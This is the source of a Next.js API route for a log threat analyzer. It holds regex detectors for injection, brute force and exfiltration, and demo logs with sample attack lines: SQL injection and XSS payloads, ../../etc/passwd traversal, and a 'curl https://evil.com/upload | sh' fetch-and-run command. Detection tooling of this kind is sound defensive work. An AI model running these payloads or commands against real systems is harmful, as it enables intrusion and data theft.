import { NextRequest, NextResponse } from "next/server";
import { getShieldXAuthorizedUser, enforceShieldXFeatureAccess, enforceShieldXScanLimit } from "@/lib/shieldx-route-auth";
import { rateLimit } from "@/lib/rate-limit";
import dbConnect from "@/lib/mongodb";
import User from "@/models/User";
import { generateFix, type Severity } from "@/lib/fix-engine";

export const maxDuration = 15;
export const dynamic = "force-dynamic";

/* ── Threat detection patterns ── */
interface ThreatPattern {
  id: string;
  name: string;
  category: string;
  severity: "critical" | "high" | "medium" | "low";
  detect: (lines: string[]) => ThreatFinding[];
}

interface ThreatFinding {
  patternId: string;
  name: string;
  category: string;
  severity: "critical" | "high" | "medium" | "low";
  evidence: string[];
  count: number;
  detail: string;
  remediation: string;
  fix?: string;
  fixCommand?: string | null;
  codeExample?: string | null;
  effort?: "low" | "medium" | "high";
  compliance?: string[];
  riskScore?: number;
  priority?: "CRITICAL" | "HIGH" | "MEDIUM" | "LOW";
}

const THREAT_PATTERNS: ThreatPattern[] = [
  {
    id: "brute-force",
    name: "Brute Force Attack",
    category: "Authentication",
    severity: "critical",
    detect: (lines) => {
      const failedLogins = lines.filter((l) =>
        /failed\s+(login|auth|password|sign.?in)|invalid\s+(credentials|password|token)|401\s+unauthorized|authentication\s+failed/i.test(l)
      );
      if (failedLogins.length >= 5) {
        // Check for same IP
        const ips = new Map<string, number>();
        for (const line of failedLogins) {
          const ipMatch = line.match(/\b(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})\b/);
          if (ipMatch) ips.set(ipMatch[1], (ips.get(ipMatch[1]) || 0) + 1);
        }
        const topIps = [...ips.entries()].filter(([, count]) => count >= 3).sort((a, b) => b[1] - a[1]);
        if (topIps.length > 0 || failedLogins.length >= 10) {
          return [{
            patternId: "brute-force",
            name: "Brute Force Attack",
            category: "Authentication",
            severity: "critical",
            evidence: failedLogins.slice(0, 5),
            count: failedLogins.length,
            detail: `${failedLogins.length} failed login attempts detected${topIps.length > 0 ? `. Top source IPs: ${topIps.slice(0, 3).map(([ip, c]) => `${ip} (${c}x)`).join(", ")}` : ""}`,
            remediation: "Implement account lockout after 5 failed attempts. Add CAPTCHA. Use rate limiting. Consider IP blocking for repeat offenders.",
          }];
        }
      }
      return [];
    },
  },
  {
    id: "sql-injection",
    name: "SQL Injection Attempt",
    category: "Injection",
    severity: "critical",
    detect: (lines) => {
      const sqli = lines.filter((l) =>
        /('|"|%27|%22)\s*(OR|AND|UNION|SELECT|INSERT|UPDATE|DELETE|DROP|--|;|\/\*)/i.test(l) ||
        /UNION\s+(ALL\s+)?SELECT/i.test(l) ||
        /1\s*=\s*1|1\s*=\s*'1'|'\s*OR\s*'1'\s*=\s*'1/i.test(l) ||
        /SLEEP\s*\(\s*\d+\s*\)|BENCHMARK\s*\(/i.test(l) ||
        /LOAD_FILE|INTO\s+OUTFILE|INTO\s+DUMPFILE/i.test(l)
      );
      if (sqli.length > 0) {
        return [{
          patternId: "sql-injection",
          name: "SQL Injection Attempt",
          category: "Injection",
          severity: "critical",
          evidence: sqli.slice(0, 5),
          count: sqli.length,
          detail: `${sqli.length} log entries match SQL injection patterns (UNION SELECT, OR 1=1, SLEEP(), etc.)`,
          remediation: "Use parameterized queries/prepared statements. Validate and sanitize all input. Implement WAF rules. Block offending IPs.",
        }];
      }
      return [];
    },
  },
  {
    id: "xss-attempt",
    name: "Cross-Site Scripting (XSS) Attempt",
    category: "Injection",
    severity: "high",
    detect: (lines) => {
      const xss = lines.filter((l) =>
        /<script[\s>]|javascript:|onerror\s*=|onload\s*=|onclick\s*=|<img[^>]+onerror/i.test(l) ||
        /%3Cscript|%3Csvg|%3Ciframe/i.test(l) ||
        /document\.cookie|alert\s*\(|eval\s*\(/i.test(l)
      );
      if (xss.length > 0) {
        return [{
          patternId: "xss-attempt",
          name: "Cross-Site Scripting (XSS) Attempt",
          category: "Injection",
          severity: "high",
          evidence: xss.slice(0, 5),
          count: xss.length,
          detail: `${xss.length} log entries contain XSS payloads (<script>, javascript:, onerror=, etc.)`,
          remediation: "Implement Content Security Policy (CSP). HTML-encode all output. Use framework auto-escaping. Validate input on server side.",
        }];
      }
      return [];
    },
  },
  {
    id: "path-traversal",
    name: "Path Traversal / Directory Traversal",
    category: "Injection",
    severity: "high",
    detect: (lines) => {
      const traversal = lines.filter((l) =>
        /\.\.\//g.test(l) && (/etc\/passwd|etc\/shadow|windows\/system32|boot\.ini/i.test(l) || (l.match(/\.\.\//g) || []).length >= 3)
      );
      if (traversal.length > 0) {
        return [{
          patternId: "path-traversal",
          name: "Path Traversal / Directory Traversal",
          category: "Injection",
          severity: "high",
          evidence: traversal.slice(0, 5),
          count: traversal.length,
          detail: `${traversal.length} requests contain path traversal sequences (../../etc/passwd, etc.)`,
          remediation: "Validate file paths. Use allowlists for accessible directories. Chroot/sandbox file operations. Never use user input directly in file paths.",
        }];
      }
      return [];
    },
  },
  {
    id: "command-injection",
    name: "Command Injection Attempt",
    category: "Injection",
    severity: "critical",
    detect: (lines) => {
      const cmdi = lines.filter((l) =>
        /;\s*(cat|ls|whoami|id|uname|curl|wget|nc|ncat|bash|sh|python|perl|ruby|php)\s/i.test(l) ||
        /\|\s*(cat|ls|whoami|id|bash|sh|nc)\s/i.test(l) ||
        /`[^`]*(cat|ls|whoami|id|uname)[^`]*`/i.test(l) ||
        /\$\([^)]*\)/i.test(l) && /cat|ls|whoami|id|rm|curl|wget/i.test(l)
      );
      if (cmdi.length > 0) {
        return [{
          patternId: "command-injection",
          name: "Command Injection Attempt",
          category: "Injection",
          severity: "critical",
          evidence: cmdi.slice(0, 5),
          count: cmdi.length,
          detail: `${cmdi.length} log entries contain shell command injection patterns (;cat, |whoami, backtick execution)`,
          remediation: "Never pass user input to shell commands. Use parameterized APIs. Validate/sanitize all input. Use exec() with argument arrays, not shell strings.",
        }];
      }
      return [];
    },
  },
  {
    id: "high-frequency-ip",
    name: "High-Frequency IP Activity",
    category: "Anomaly",
    severity: "medium",
    detect: (lines) => {
      const ips = new Map<string, number>();
      for (const line of lines) {
        const m = line.match(/\b(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})\b/);
        if (m) ips.set(m[1], (ips.get(m[1]) || 0) + 1);
      }
      const threshold = Math.max(50, lines.length * 0.3);
      const hotIps = [...ips.entries()].filter(([, c]) => c >= threshold).sort((a, b) => b[1] - a[1]);
      if (hotIps.length > 0) {
        return [{
          patternId: "high-frequency-ip",
          name: "High-Frequency IP Activity",
          category: "Anomaly",
          severity: "medium",
          evidence: hotIps.slice(0, 5).map(([ip, c]) => `${ip} — ${c} requests`),
          count: hotIps.reduce((a, [, c]) => a + c, 0),
          detail: `${hotIps.length} IP(s) with unusually high request volume: ${hotIps.slice(0, 3).map(([ip, c]) => `${ip} (${c}x)`).join(", ")}`,
          remediation: "Investigate source IPs. Add rate limiting. Consider blocking or CAPTCHA challenges for suspicious IPs.",
        }];
      }
      return [];
    },
  },
  {
    id: "off-hours-activity",
    name: "Off-Hours Activity",
    category: "Anomaly",
    severity: "low",
    detect: (lines) => {
      const offHours = lines.filter((l) => {
        const timeMatch = l.match(/\b([01]?\d|2[0-3]):([0-5]\d)(?::([0-5]\d))?\b/);
        if (!timeMatch) return false;
        const hour = parseInt(timeMatch[1]);
        return hour >= 0 && hour < 6;
      });
      if (offHours.length >= 10) {
        return [{
          patternId: "off-hours-activity",
          name: "Off-Hours Activity (00:00–05:59)",
          category: "Anomaly",
          severity: "low",
          evidence: offHours.slice(0, 5),
          count: offHours.length,
          detail: `${offHours.length} events occurred during off-hours (00:00–05:59). May indicate automated attacks or unauthorized access.`,
          remediation: "Review off-hours access patterns. Implement geo-blocking if traffic is from unexpected regions. Enable MFA for sensitive operations.",
        }];
      }
      return [];
    },
  },
  {
    id: "privilege-escalation",
    name: "Privilege Escalation Activity",
    category: "Authorization",
    severity: "high",
    detect: (lines) => {
      // Only flag suspicious patterns — exclude routine sudo usage
      const suspiciousPrivEsc = lines.filter((l) =>
        /privilege.?escalat|role.?change.*admin|became\s+root|setuid|chmod\s+[47]/i.test(l) ||
        /access.?denied.*then.*success|forbidden.*then.*allowed/i.test(l)
      );
      const sudoLines = lines.filter((l) => /sudo|su\s+-|runas/i.test(l));
      const allPrivEsc = [...suspiciousPrivEsc, ...sudoLines];
      if (allPrivEsc.length > 0) {
        // Confirmed suspicious patterns = high severity; routine sudo = medium
        const isSuspicious = suspiciousPrivEsc.length > 0;
        return [{
          patternId: "privilege-escalation",
          name: isSuspicious ? "Suspicious Privilege Escalation" : "Privilege Change Activity",
          category: "Authorization",
          severity: isSuspicious ? "high" : "medium",
          evidence: (isSuspicious ? suspiciousPrivEsc : sudoLines).slice(0, 5),
          count: allPrivEsc.length,
          detail: isSuspicious
            ? `${suspiciousPrivEsc.length} entries show suspicious privilege escalation (role changes, setuid, access bypass).`
            : `${sudoLines.length} sudo/su commands detected — review for legitimacy (may be routine admin operations).`,
          remediation: isSuspicious
            ? "Audit all privilege changes. Implement least-privilege access. Alert on role escalations. Use mandatory access controls."
            : "Review sudo usage. Ensure it aligns with authorized admin activity. Consider implementing just-in-time access.",
        }];
      }
      return [];
    },
  },
  {
    id: "data-exfiltration",
    name: "Data Exfiltration / Suspicious Outbound",
    category: "Data Loss",
    severity: "high",
    detect: (lines) => {
      const exfil = lines.filter((l) =>
        /curl\s+.*\|\s*sh|wget\s+.*-O\s*-|nc\s+-[lp]|ncat\s+|base64.*\|.*curl/i.test(l) ||
        /export.*\.sql|mysqldump|pg_dump|mongodump/i.test(l) ||
        /s3.*cp.*s3:|gsutil.*cp|az.*storage.*upload/i.test(l)
      );
      if (exfil.length > 0) {
        return [{
          patternId: "data-exfiltration",
          name: "Data Exfiltration / Suspicious Outbound",
          category: "Data Loss",
          severity: "high",
          evidence: exfil.slice(0, 5),
          count: exfil.length,
          detail: `${exfil.length} log entries suggest data exfiltration (database dumps, piped downloads, cloud upload commands).`,
          remediation: "Monitor outbound data transfers. Implement DLP policies. Restrict cloud storage access. Alert on large data exports.",
        }];
      }
      return [];
    },
  },
  {
    id: "error-spike",
    name: "Error Rate Spike",
    category: "Availability",
    severity: "medium",
    detect: (lines) => {
      const errors = lines.filter((l) =>
        /\b(500|502|503|504)\b.*error|internal\s+server\s+error|exception|stacktrace|traceback|fatal|panic|segfault/i.test(l)
      );
      const errorRate = lines.length > 0 ? errors.length / lines.length : 0;
      if (errors.length >= 10 || errorRate > 0.2) {
        return [{
          patternId: "error-spike",
          name: "Error Rate Spike",
          category: "Availability",
          severity: "medium",
          evidence: errors.slice(0, 5),
          count: errors.length,
          detail: `${errors.length} server errors detected (${(errorRate * 100).toFixed(1)}% error rate). 500/502/503/504 status codes, exceptions, stack traces.`,
          remediation: "Investigate error sources. Check resource limits, memory, disk. Review recent deployments. Add circuit breakers and health checks.",
        }];
      }
      return [];
    },
  },
  {
    id: "sensitive-data-exposure",
    name: "Sensitive Data in Logs",
    category: "Data Loss",
    severity: "high",
    detect: (lines) => {
      const sensitive = lines.filter((l) =>
        /password\s*[:=]\s*\S+|credit.?card|ssn\s*[:=]|\b\d{4}[-\s]\d{4}[-\s]\d{4}[-\s]\d{4}\b|bearer\s+[A-Za-z0-9._-]{20,}/i.test(l)
      );
      if (sensitive.length > 0) {
        return [{
          patternId: "sensitive-data-exposure",
          name: "Sensitive Data in Logs",
          category: "Data Loss",
          severity: "high",
          evidence: sensitive.slice(0, 3).map((l) => l.slice(0, 100) + (l.length > 100 ? "..." : "")),
          count: sensitive.length,
          detail: `${sensitive.length} log entries contain potentially sensitive data (passwords, credit card numbers, bearer tokens).`,
          remediation: "Never log sensitive data. Implement log sanitization. Mask PII/credentials before logging. Review logging library configuration.",
        }];
      }
      return [];
    },
  },
];

/* ── Demo log data ── */
const DEMO_LOGS = `2026-03-20 02:14:33 [INFO] 192.168.1.105 - POST /api/login - 401 Unauthorized - Invalid credentials for user admin
2026-03-20 02:14:35 [INFO] 192.168.1.105 - POST /api/login - 401 Unauthorized - Invalid credentials for user admin
2026-03-20 02:14:36 [INFO] 192.168.1.105 - POST /api/login - 401 Unauthorized - Invalid credentials for user admin
2026-03-20 02:14:37 [INFO] 192.168.1.105 - POST /api/login - 401 Unauthorized - Invalid credentials for user admin
2026-03-20 02:14:38 [INFO] 192.168.1.105 - POST /api/login - 401 Unauthorized - Invalid credentials for user admin
2026-03-20 02:14:39 [INFO] 192.168.1.105 - POST /api/login - 401 Unauthorized - Invalid credentials for user admin
2026-03-20 02:14:40 [INFO] 192.168.1.105 - POST /api/login - 200 OK - Login successful for admin
2026-03-20 02:15:01 [WARN] 10.0.0.45 - GET /api/users?id=1' OR '1'='1 - 400 Bad Request
2026-03-20 02:15:02 [WARN] 10.0.0.45 - GET /api/users?id=1 UNION SELECT username,password FROM users-- - 400 Bad Request
2026-03-20 02:15:04 [WARN] 10.0.0.45 - POST /api/search?q=<script>alert(document.cookie)</script> - 400 Bad Request
2026-03-20 02:15:05 [WARN] 10.0.0.45 - POST /api/search?q=%3Cscript%3Ealert(1)%3C/script%3E - 400 Bad Request  
2026-03-20 02:16:10 [ERROR] 10.0.0.45 - GET /api/files?path=../../../../etc/passwd - 403 Forbidden
2026-03-20 02:16:12 [ERROR] 10.0.0.45 - GET /api/files?path=../../../etc/shadow - 403 Forbidden
2026-03-20 02:17:00 [INFO] sudo: user1 : TTY=pts/0 ; PWD=/home/user1 ; USER=root ; COMMAND=/bin/bash
2026-03-20 02:17:15 [WARN] Role change: user john@acme.com became admin via API
2026-03-20 02:18:00 [INFO] 10.0.0.50 - POST /api/export - 200 OK - mysqldump production_db > /tmp/backup.sql
2026-03-20 02:18:05 [INFO] 10.0.0.50 - curl https://evil.com/upload | sh
2026-03-20 02:20:00 [ERROR] 500 Internal Server Error - NullPointerException at com.app.UserService.getUser(UserService.java:45)
2026-03-20 02:20:01 [ERROR] 500 Internal Server Error - stacktrace: at java.base/java.util.Objects.requireNonNull
2026-03-20 02:20:02 [ERROR] 500 Internal Server Error - Failed to process request
2026-03-20 02:20:03 [ERROR] 502 Bad Gateway - upstream connect error
2026-03-20 02:20:04 [ERROR] 500 Internal Server Error - fatal: out of memory
2026-03-20 02:20:05 [ERROR] 503 Service Unavailable
2026-03-20 02:20:06 [ERROR] 500 Internal Server Error - exception processing request
2026-03-20 02:20:07 [ERROR] 500 Internal Server Error - panic: runtime error
2026-03-20 02:20:08 [ERROR] 500 Internal Server Error - traceback
2026-03-20 02:20:09 [ERROR] 500 Internal Server Error - segfault at 0x0
2026-03-20 02:21:00 [WARN] Logging password=SuperS3cret123 for debug
2026-03-20 02:21:01 [INFO] Payment processed: credit_card 4532-1234-5678-9012 charged $49.99
2026-03-20 03:00:00 [INFO] 10.0.0.99 - GET /api/health - 200 OK
2026-03-20 03:01:00 [INFO] 10.0.0.99 - GET /api/status - 200 OK
2026-03-20 03:02:00 [INFO] 10.0.0.99 - POST /api/data - 200 OK
2026-03-20 04:15:00 [INFO] 10.0.0.99 - DELETE /api/records/all - 200 OK
2026-03-20 04:16:00 [INFO] 10.0.0.99 - POST /api/export - 200 OK
`;

function analyzeLogs(logText: string): { findings: ThreatFinding[]; stats: Record<string, number>; totalLines: number } {
  const lines = logText.split("\n").filter((l) => l.trim().length > 0);
  const findings: ThreatFinding[] = [];

  for (const pattern of THREAT_PATTERNS) {
    const rawResults = pattern.detect(lines);
    for (const r of rawResults) {
      const fixResult = generateFix({
        scanType: "logs",
        id: r.patternId,
        title: r.name,
        severity: r.severity as Severity,
        confidence: "high",
        description: r.detail,
        patternId: r.patternId,
        category: r.category,
      });
      findings.push({
        ...r,
        fix: fixResult.fix,
        fixCommand: fixResult.fixCommand,
        codeExample: fixResult.codeExample,
        effort: fixResult.effort,
        compliance: fixResult.compliance,
        riskScore: fixResult.riskScore,
        priority: fixResult.priority,
      });
    }
  }

  // Sort by severity
  const order = { critical: 0, high: 1, medium: 2, low: 3 };
  findings.sort((a, b) => order[a.severity] - order[b.severity]);

  const stats = {
    critical: findings.filter((f) => f.severity === "critical").length,
    high: findings.filter((f) => f.severity === "high").length,
    medium: findings.filter((f) => f.severity === "medium").length,
    low: findings.filter((f) => f.severity === "low").length,
    total: findings.length,
  };

  return { findings, stats, totalLines: lines.length };
}

export async function POST(request: NextRequest) {
  try {
    const body = await request.json();
    const isDemo = body?.demo === true;

    if (isDemo) {
      const ip = request.headers.get("x-forwarded-for")?.split(",")[0]?.trim() || "unknown";
      const rl = await rateLimit(`scan-logs-demo:${ip}`, { maxRequests: 5, windowSeconds: 3600 });
      if (!rl.allowed) {
        return NextResponse.json(
          { error: "Demo rate limit reached (5 scans/hour). Upgrade to Pro for unlimited log analysis." },
          { status: 429 }
        );
      }

      const analysis = analyzeLogs(DEMO_LOGS);
      return NextResponse.json({
        mode: "demo",
        ...analysis,
        patternsChecked: THREAT_PATTERNS.length,
        timestamp: new Date().toISOString(),
      });
    }

    // Authenticated scan
    const user = await getShieldXAuthorizedUser(request, "pro", { allowApiKey: true });
    if (!user) {
      // Auth failed — fall back to demo mode
      const ip = request.headers.get("x-forwarded-for")?.split(",")[0]?.trim() || "unknown";
      const rl = await rateLimit(`scan-logs-demo:${ip}`, { maxRequests: 5, windowSeconds: 3600 });
      if (!rl.allowed) {
        return NextResponse.json(
          { error: "Demo rate limit reached (5 scans/hour). Sign in for unlimited access." },
          { status: 429 }
        );
      }
      const logs = body?.logs;
      const logsToScan = (logs && typeof logs === "string" && logs.trim().length >= 10) ? logs : DEMO_LOGS;
      const analysis = analyzeLogs(logsToScan);
      return NextResponse.json({
        mode: "demo",
        ...analysis,
        patternsChecked: THREAT_PATTERNS.length,
        timestamp: new Date().toISOString(),
      });
    }

    const logs = body?.logs;
    if (!logs || typeof logs !== "string" || logs.trim().length < 10) {
      return NextResponse.json({ error: "Provide log text to analyze (minimum 10 characters)." }, { status: 400 });
    }
    if (logs.length > 1_000_000) {
      return NextResponse.json({ error: "Input too large. Maximum 1MB of log data." }, { status: 400 });
    }

    // Enforce feature access and scan limits for paid users
    try {
      enforceShieldXFeatureAccess(user, "log-analyzer");
      enforceShieldXScanLimit(user, 1);
    } catch (err) {
      const message = err instanceof Error ? err.message : "Access denied";
      return NextResponse.json({ error: message }, { status: 403 });
    }

    const analysis = analyzeLogs(logs);

    await dbConnect();
    await User.findByIdAndUpdate(user.id, { $inc: { shieldxScanCount: 1 } });

    return NextResponse.json({
      mode: "paid",
      ...analysis,
      patternsChecked: THREAT_PATTERNS.length,
      timestamp: new Date().toISOString(),
    });
  } catch (err) {
    const msg = err instanceof Error ? err.message : "Log analysis failed";
    const status = msg.includes("limit") || msg.includes("Access denied") ? 403 : 500;
    return NextResponse.json({ error: msg }, { status });
  }
}
